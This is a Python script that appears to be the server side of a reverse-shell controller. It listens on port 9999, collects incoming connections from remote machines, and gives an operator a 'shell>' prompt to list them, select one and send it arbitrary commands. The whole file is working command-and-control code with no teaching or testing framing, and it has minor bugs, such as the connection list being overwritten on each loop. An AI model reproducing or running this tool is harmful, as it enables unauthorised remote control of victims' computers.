import socket
import sys
import threading
import time
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
all_connections = []
all_addresses = []


# Socket is a connection of 2 computers
def create_socket():
    try:
        global host
        global port
        global s
        host = ''
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print('Socket creation error: ' + str(msg))


# Binding the socket and listening fo connection
def bind_socket():
    try:
        global host
        global port
        global s

        print('Binding the port: ' + str(port))

        s.bind((host, port))
        s.listen(5)

    except socket.error as msg:
        print('Socket binding error ' + str(msg) + '\n' + 'Retrying...')
        bind_socket()


# Handling connections from multiple clients and saving to a list
# Closing previous connections when server.py is restarted
def accepting_connections():
    for c in all_connections:
        c.close()

    all_connections.clear()
    all_addresses.clear()

    while True:
        try:
            conn, addr = s.accept()
            s.setblocking(1)  # prevents timeout disconnections

            all_connections.append(conn)
            all_addresses.append(addr)

            print('Connection has been established: ' + addr[0])

        except:
            print('Error accepting connections')


# 2nd thread functions

def start_shell():
    while True:
        cmd = input('shell>')
        if cmd == 'q':
            break
        elif cmd == 'list':
            list_connections()

        elif cmd[:6] == 'select':
            conn = get_conn(cmd[7:])
            if conn is not None:
                send_commands_to_target(conn)

        else:
            print('Command was not recognized')


# Display all current active connections

def list_connections():
    results = ''

    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(200000)
        except:
            del all_connections[i]
            del all_addresses[i]
            continue

        results = str(i) + ' ' + str(all_addresses[i][0]) + ' ' + str(all_addresses[i][1]) + '\n'

    print('--------Clients---------')
    print(results)


def get_conn(str_id):
    try:
        id = int(str_id)
        print('You are now connected to ' + all_addresses[id][0])
        print(str(all_addresses[id][0]) + '>', end='')
    except:
        print('Wrong target id!')
        return None
    return all_connections[id]


def send_commands_to_target(conn):
    while True:
        try:
            cmd = input()
            if cmd == 'q' or cmd == 'quit':
                break
            elif len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(1024), 'utf-8', errors='ignore')
                print(client_response, end='')
        except:
            print('Error sending commands')
            break


# Create worker thread
def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()


# Do next job that is in the queue (handle connections, send commands)
def work():
    while True:
        job = queue.get()
        if job == 1:
            create_socket()
            bind_socket()
            accepting_connections()
        elif job == 2:
            start_shell()

        queue.task_done()


def create_jobs():
    for job in JOB_NUMBER:
        queue.put(job)

    queue.join()


create_workers()
create_jobs()